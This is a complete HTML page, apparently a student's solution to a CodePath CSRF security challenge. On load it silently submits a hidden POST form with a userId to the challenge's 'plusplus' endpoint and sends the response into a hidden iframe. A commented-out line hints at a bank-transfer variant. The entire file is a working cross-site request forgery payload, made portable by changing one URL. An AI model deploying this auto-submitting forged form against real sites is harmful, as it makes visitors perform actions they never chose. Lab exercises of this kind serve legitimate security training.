<html>
  <head>
    <title>Fake Form</title>
  </head>
  <body onload="document.bank_form.submit()">
    <form action="https://security.codepath.com/user/csrfchallengetwo/plusplus" method="POST" name="bank_form" style="display: none;" target="hidden_results" >
      <input type="text" name="userId" value="2b26df84c9bfd1c221b52f8fcc59129a3c9b5ab2" />
      <!-- <input type="text" name="to_account" value="2468013579" /> -->
    </form>
    <iframe name="hidden_results" style="display: none;"></iframe>
  </body>
</html>
